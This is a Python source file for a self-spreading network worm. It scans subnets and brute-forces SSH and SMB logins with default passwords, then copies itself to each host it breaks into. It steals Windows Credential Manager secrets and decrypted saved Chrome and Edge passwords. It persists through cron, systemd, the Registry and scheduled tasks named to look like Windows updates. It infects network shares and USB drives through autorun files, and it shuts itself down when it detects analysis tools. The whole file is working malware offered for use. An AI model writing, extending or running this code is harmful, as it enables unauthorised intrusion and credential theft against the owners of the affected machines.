import hashlib
import os
import sys
import socket
import threading
from io import StringIO

import paramiko
import subprocess
import logging
import random
from pathlib import Path
from time import sleep
from concurrent.futures import ThreadPoolExecutor, as_completed
import ipaddress
import sqlite3
import shutil
import win32crypt
import win32cred
from smb.SMBConnection import SMBConnection
from smb.base import OperationFailure

# Configuration
SCAN_SUBNETS = ["192.168.100.0/24", "10.0.0.0/16"]
COMMON_PORTS = [22, 445, 3389, 5985, 5986, 135, 139]
MAX_WORKERS = 25
BEACON_PORT = 31337
DELAY_VARIANCE = (150, 300)
ANTI_DEBUG_INTERVAL = 300

CREDS = [
    ('administrator', 'P@ssw0rd'), ('admin', 'Admin123'),
    ('user', 'Welcome1'), ('svc_account', 'Summer2023!'),
    ('labuser', 'Password123'), ('root', 'toor'), ('pi', 'raspberry')
]


class NetworkWorm:
    def __init__(self):
        self.worm_path = Path(__file__).resolve()
        self.fingerprint = self._generate_fingerprint()
        self.lock = threading.Lock()
        self.CREDS = CREDS.copy()  # Initialize instance CREDS
        self._setup_logging()
        self._verify_prerequisites()
        self._anti_analysis_thread()
        self._kill_previous_instances()

    def _generate_fingerprint(self):
        return hashlib.sha256(open(__file__, 'rb').read()).hexdigest()[:16]

    def _setup_logging(self):
        logging.basicConfig(
            filename='.systemlogs',
            level=logging.DEBUG,
            format='%(asctime)s [%(levelname)s] %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )

    def _verify_prerequisites(self):
        try:
            if os.name == 'nt' and not Path("PsExec.exe").exists():
                subprocess.run(
                    ['curl', '-sO', 'https://live.sysinternals.com/tools/PsExec.exe'],
                    check=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL
                )
        except Exception as e:
            logging.error(f"Prerequisite error: {str(e)}")

    def spread(self):
        while True:
            try:
                self.self_replicate()
                self._evolve_persistence()
                self.scan_networks()
                sleep(random.uniform(*DELAY_VARIANCE))
                if random.random() < 0.3:
                    self._lateral_movement()
            except Exception as e:
                logging.error(f"Propagation error: {str(e)}")
                sleep(30)

    def _evolve_persistence(self):
        try:
            if os.name == 'posix':
                random.choice([
                    self._cron_persistence,
                    self._systemd_persistence
                ])()
            else:
                random.choice([
                    self._registry_persistence,
                    self._scheduled_task_persistence
                ])()
        except Exception as e:
            logging.error(f"Persistence error: {str(e)}")

    def _systemd_persistence(self):
        service_file = f"/etc/systemd/system/.{self.fingerprint}.service"
        if not Path(service_file).exists():
            content = f"""
            [Unit]
            Description=System Logging Service
            [Service]
            ExecStart={self.worm_path}
            Restart=always
            RestartSec=60
            [Install]
            WantedBy=multi-user.target
            """
            with open(service_file, 'w') as f:
                f.write(content)
            subprocess.run(['systemctl', 'daemon-reload', 'enable', service_file])

    def _lateral_movement(self):
        try:
            if os.name == 'nt':
                self._dump_windows_creds()
            self._exploit_network_shares()
            self._infect_removable_drives()
        except Exception as e:
            logging.error(f"Lateral movement error: {str(e)}")

    def _dump_windows_creds(self):
        try:
            harvested_creds = []

            # Windows Credential Manager
            try:
                creds = win32cred.CredEnumerate(None, 0)
                for cred in creds:
                    if cred['Type'] in [win32cred.CRED_TYPE_GENERIC, win32cred.CRED_TYPE_DOMAIN_PASSWORD]:
                        harvested_creds.append({
                            'source': 'Windows Credentials',
                            'user': cred['UserName'],
                            'password': cred['CredentialBlob'].decode('utf-16-le')
                        })
            except Exception as e:
                logging.error(f"Credential Manager error: {str(e)}")

            # Browser Credentials
            harvested_creds.extend(self._extract_browser_creds('Chrome'))
            harvested_creds.extend(self._extract_browser_creds('Edge'))

            # Update CREDS list
            for entry in harvested_creds:
                if entry.get('user') and entry.get('password'):
                    self.CREDS.append((entry['user'], entry['password']))

            return harvested_creds
        except Exception as e:
            logging.error(f"Credential dump failed: {str(e)}")
            return []

    def _extract_browser_creds(self, browser):
        try:
            appdata = os.getenv('LOCALAPPDATA')
            paths = {
                'Chrome': Path(appdata) / 'Google' / 'Chrome' / 'User Data',
                'Edge': Path(appdata) / 'Microsoft' / 'Edge' / 'User Data'
            }

            login_db = paths[browser] / 'Default' / 'Login Data'
            if not login_db.exists():
                return []

            temp_db = Path(os.getenv('TEMP')) / f'{browser}_temp.db'
            shutil.copy2(login_db, temp_db)

            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

            credentials = []
            for url, user, enc_pw in cursor.fetchall():
                try:
                    password = win32crypt.CryptUnprotectData(enc_pw, None, None, None, 0)[1].decode()
                    credentials.append({'source': browser, 'url': url, 'user': user, 'password': password})
                except Exception as e:
                    logging.error(f"Decryption failed: {str(e)}")

            conn.close()
            temp_db.unlink()
            return credentials
        except Exception as e:
            logging.error(f"Browser creds error: {str(e)}")
            return []

    def scan_networks(self):
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = []
            for subnet in SCAN_SUBNETS:
                network = ipaddress.ip_network(subnet, strict=False)
                futures.extend(executor.submit(self._probe_host, str(host)) for host in network.hosts())

            for future in as_completed(futures):
                if future.result():
                    logging.info(f"Infected host: {future.result()}")

    def _probe_host(self, ip):
        if self._is_infected(ip):
            return None

        for port in COMMON_PORTS:
            try:
                with socket.create_connection((ip, port), timeout=1.5):
                    return self._attack_host(ip, port)
            except:
                continue
        return None

    def _attack_host(self, ip, port):
        try:
            return {
                22: self._ssh_infection,
                445: self._smb_infection
            }.get(port, lambda x: None)(ip)
        except Exception as e:
            logging.error(f"Attack failed: {str(e)}")
            return None

    def _ssh_infection(self, ip):
        # Use persistent path
        dest_path = f"/usr/local/bin/.{self.fingerprint}.py"

        for user, passwd in random.sample(CREDS, len(CREDS)):  # Random order
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, username=user, password=passwd, timeout=10, banner_timeout=15)

                with client.open_sftp() as sftp:
                    sftp.put(__file__, dest_path)
                    sftp.chmod(dest_path, 0o755)

                # Add to rc.local for persistence
                client.exec_command(
                    f"echo 'python {dest_path}' | sudo tee -a /etc/rc.local"
                )
                self._mark_infection(ip)
                return ip
            except paramiko.ssh_exception.SSHException as e:
                logging.debug(f"SSH failed with {user}: {str(e)}")
                continue
        return None

    def _smb_infection(self, ip):
        try:
            # Copy as Python file instead of .exe
            dest_file = f"{self.fingerprint}.py"
            dest_path = fr"\\{ip}\C$\Windows\Temp\{dest_file}"

            # Copy worm script
            shutil.copyfile(self.worm_path, dest_path)

            # Create scheduled task to run with Python
            subprocess.run([
                'schtasks', '/create', '/s', ip, '/tn',
                f'WindowsUpdate_{self.fingerprint}', '/tr',
                f'python "{dest_path}"', '/sc', 'ONSTART',
                '/ru', 'SYSTEM', '/f'
            ], check=True, timeout=30)

            self._mark_infection(ip)
            return ip
        except subprocess.TimeoutExpired:
            logging.error("SMB task creation timed out")
            return None
        except Exception as e:
            logging.error(f"SMB infection failed: {str(e)}")
            return None

    def self_replicate(self):
        try:
            if os.name == 'posix':
                # Use persistent directory
                dest = f"/usr/lib/.{self.fingerprint}.py"
                shutil.copy(__file__, dest)
                os.chmod(dest, 0o755)
                subprocess.run(
                    f"(crontab -l ; echo '@reboot python {dest}') | crontab -",
                    shell=True
                )
            else:
                # Copy as Python file
                dest = Path(os.getenv('APPDATA')) / f"Microsoft\\{self.fingerprint}.py"
                shutil.copy(__file__, dest)

                # Registry command with Python
                subprocess.run(
                    f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                    f'/v "{self.fingerprint}" /t REG_SZ /d "python \\"{dest}\\"" /f',
                    shell=True,
                    check=True
                )
        except Exception as e:
            logging.error(f"Replication failed: {str(e)}")

    def _emergency_shutdown(self):
        try:
            if os.name == 'posix':
                Path(__file__).unlink()
                subprocess.run('crontab -r', shell=True)
            else:
                Path(__file__).unlink()
                subprocess.run(
                    f'reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                    f'/v "{self.fingerprint}" /f',
                    shell=True
                )
        finally:
            sys.exit(0)

    def _anti_analysis_thread(self):
        def monitor():
            while True:
                if self._detect_analysis():
                    self._emergency_shutdown()
                sleep(ANTI_DEBUG_INTERVAL)

        threading.Thread(target=monitor, daemon=True).start()

    def _detect_analysis(self):
        # Check for common analysis environments
        analysis_indicators = [
            "vbox" in sys.modules,
            "vmware" in (os.getenv('VBOX_INSTALL_PATH', '') + os.getenv('VMWARE_ROOT', '')).lower()
        ]

        # Linux-specific checks with error handling
        if os.name == 'posix':
            try:
                status = Path("/proc/self/status").read_text(encoding='utf-8')
                analysis_indicators.append(status.count("TracerPid:") > 0)
            except FileNotFoundError:
                # Handle Windows Subsystem for Linux (WSL) edge cases
                analysis_indicators.append(False)
            except Exception as e:
                logging.error(f"Analysis detection error: {str(e)}")
                analysis_indicators.append(False)

        return any(analysis_indicators)

    def _kill_previous_instances(self):
        # Windows: Use mutex; Linux: Use PID file
        if os.name == 'nt':
            import win32event
            import win32api  # Correct module import
            try:
                self.mutex = win32event.CreateMutex(None, False, f"Global\\{self.fingerprint}")
                # Get error code using correct module
                last_error = win32api.GetLastError()
                if last_error == 183:  # ERROR_ALREADY_EXISTS
                    logging.info("Another instance is already running")
                    sys.exit(0)
            except Exception as e:
                logging.error(f"Mutex creation failed: {str(e)}")
                sys.exit(1)
        else:
            pid_file = Path(f"/tmp/{self.fingerprint}.pid")
            if pid_file.exists():
                try:
                    old_pid = int(pid_file.read_text())
                    os.kill(old_pid, 9)
                except:
                    pass
            pid_file.write_text(str(os.getpid()))

    def _cron_persistence(self):
        cron_entry = f"@reboot {self.worm_path} >/dev/null 2>&1"
        try:
            subprocess.run(
                f'(crontab -l | grep -v "{self.worm_path}"; echo "{cron_entry}") | crontab -',
                shell=True, check=True
            )
        except subprocess.CalledProcessError as e:
            logging.error(f"Cron persistence failed: {e}")

    def _registry_persistence(self):
        dest = Path(os.getenv('APPDATA')) / f"Microsoft\\{self.fingerprint}.exe"
        if not dest.exists():
            shutil.copy(self.worm_path, dest)
        subprocess.run(
            f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
            f'/v "{self.fingerprint}" /t REG_SZ /d "{dest}" /f',
            shell=True, check=True
        )

    def _scheduled_task_persistence(self):
        dest = Path(os.getenv('APPDATA')) / f"Microsoft\\{self.fingerprint}.exe"
        subprocess.run([
            'schtasks', '/create', '/tn', f'WindowsUpdate_{self.fingerprint}',
            '/tr', f'"{dest}"', '/sc', 'ONLOGON', '/ru', 'SYSTEM', '/f'
        ], check=True)

    def _exploit_network_shares(self):
        # Validate IP ranges before scanning
        valid_ips = []
        for subnet in SCAN_SUBNETS:
            network = ipaddress.ip_network(subnet, strict=False)
            for host in network.hosts():
                if str(host) not in ['192.168.100.255', '10.0.255.255']:  # Skip broadcast
                    valid_ips.append(str(host))

        for ip in valid_ips:
            try:
                # Randomize credential attempts
                random.shuffle(self.CREDS)
                conn = None

                # First try guest account
                try:
                    conn = SMBConnection('', '', 'worm', ip, use_ntlm_v2=True)
                    if not conn.connect(ip, 445, timeout=3):
                        raise OperationFailure
                except:
                    # Try credentials with randomized delay
                    for user, passwd in self.CREDS:
                        try:
                            sleep(random.uniform(0.1, 1.5))  # Evasion
                            conn = SMBConnection(user, passwd, 'worm', ip, use_ntlm_v2=True)
                            if conn.connect(ip, 445, timeout=3):
                                break
                        except:
                            continue
                    else:
                        continue

                # Target writeable shares
                shares = [s for s in conn.listShares()
                          if not s.isSpecial
                          and s.name not in ['IPC$', 'print$']
                          and 'WRITE' in s.access]

                for share in shares:
                    try:
                        dest_dir = "/Windows/Temp"
                        dest_file = f"{self.fingerprint}.py"

                        # Verify directory exists
                        if not conn.listPath(share.name, dest_dir):
                            conn.createDirectory(share.name, dest_dir)

                        # Upload worm
                        with open(self.worm_path, 'rb') as file_obj:
                            conn.storeFile(share.name, f"{dest_dir}/{dest_file}", file_obj)

                        # Create autorun.inf
                        conn.storeFile(share.name, f"{dest_dir}/autorun.inf",
                                       StringIO(f"[autorun]\nopen=python {dest_file}"))

                    except OperationFailure as e:
                        logging.error(f"Share access denied: {ip}/{share.name}")
                    except Exception as e:
                        logging.error(f"Share error {ip}/{share.name}: {str(e)}")

                conn.close()
            except Exception as e:
                continue

    def _infect_removable_drives(self):
        drives = []
        if os.name == 'nt':
            drives = [f"{d}:\\" for d in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if Path(f"{d}:\\").exists()]
        else:
            drives = [Path('/media', d) for d in os.listdir('/media') if Path('/media', d).is_mount()]

        for drive in drives:
            try:
                dest = Path(drive) / f".{self.fingerprint}"
                shutil.copy(self.worm_path, dest)
                if os.name == 'posix':
                    os.chmod(dest, 0o755)
                    (Path(drive) / ".autorun.inf").write_text(f"[autorun]\nopen={dest}")
            except Exception as e:
                logging.error(f"Removable drive infection failed on {drive}: {e}")

    def _is_infected(self, ip):
        return Path('.infected_hosts').exists() and ip in Path('.infected_hosts').read_text().splitlines()

    def _mark_infection(self, ip):
        with open('.infected_hosts', 'a+') as f:
            f.seek(0)
            hosts = f.read().splitlines()
            if ip not in hosts:
                f.write(f"{ip}\n")


if __name__ == "__main__":
    NetworkWorm().spread()